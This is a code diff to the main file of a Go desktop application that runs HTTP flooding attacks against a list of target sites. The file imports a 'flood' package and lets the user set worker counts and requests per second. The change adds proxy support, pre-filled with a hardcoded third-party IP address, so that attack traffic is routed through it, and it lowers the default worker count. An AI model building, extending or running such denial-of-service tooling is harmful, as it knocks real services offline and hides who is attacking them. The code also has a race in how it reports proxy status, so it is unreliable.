@@ -2,9 +2,10 @@ package main
 
 import (
 	"context"
-	"github.com/RusskijKorablIdiNaxuj/RusskijKorablIdiNaxuj/src/flood"
 	"fmt"
 	"strings"
+
+	"github.com/RusskijKorablIdiNaxuj/RusskijKorablIdiNaxuj/src/flood"
 
 	"fyne.io/fyne/v2"
 	"fyne.io/fyne/v2/app"
@@ -38,7 +39,7 @@ func main() {
 		if strings.Trim(line, " \r\n\t") == "" {
 			continue
 		}
-		target := flood.New(line)
+		target := flood.New(line, "")
 		targets = append(targets, target)
 		progressVals = append(progressVals, binding.NewFloat())
 		progressTexts = append(progressTexts, binding.NewString())
@@ -52,26 +53,47 @@ func main() {
 	ctx, cancel := context.WithCancel(context.Background())
 	defer cancel()
 
+	proxyOk := binding.NewBool()
+	proxy := binding.NewString()
 	numWorkers := binding.NewInt()
 	maxRequestsPerSecond := binding.NewInt()
+	proxy.Set("https://128.199.4.92:3129")
 
-	numWorkers.Set(500)
+	numWorkers.Set(100)
 	maxRequestsPerSecond.Set(1000)
 
+	pCheck := widget.NewCheckWithData("Proxy", proxyOk)
+	pCheck.Disable()
+	pEntry := widget.NewEntryWithData(proxy)
+	pEntry.PlaceHolder = "https://yourproxy:port"
 	nEntry := widget.NewEntryWithData(binding.IntToString(numWorkers))
 	rEntry := widget.NewEntryWithData(binding.IntToString(maxRequestsPerSecond))
 	nEntry.Validator = nil
 	rEntry.Validator = nil
 	menu := container.NewBorder(
-		nil, nil,
+		nil,
+		container.NewBorder(
+			nil, nil,
+			nil,
+			pCheck,
+			pEntry,
+		),
 		nil,
 		widget.NewToolbar(
 			widget.NewToolbarSeparator(),
 			widget.NewToolbarAction(theme.MediaPlayIcon(), func() {
+				proxySetup := false
 				for _i := range targets {
 					go func(i int) {
 						N, _ := numWorkers.Get()
 						maxRPS, _ := maxRequestsPerSecond.Get()
+						if proxyStr, err := proxy.Get(); err == nil && proxyStr != "" {
+							if err := targets[i].SetProxy(proxyStr); err == nil {
+								proxySetup = true
+							} else {
+								proxySetup = false
+							}
+						}
 						targets[i].Run(ctx, N, maxRPS, func(requests, errors int64) {
 							if requests == 0 {
 								progressBars[i].Max = 1
@@ -84,6 +106,7 @@ func main() {
 						})
 					}(_i)
 				}
+				proxyOk.Set(proxySetup)
 			}),
 		),
 		container.NewAdaptiveGrid(
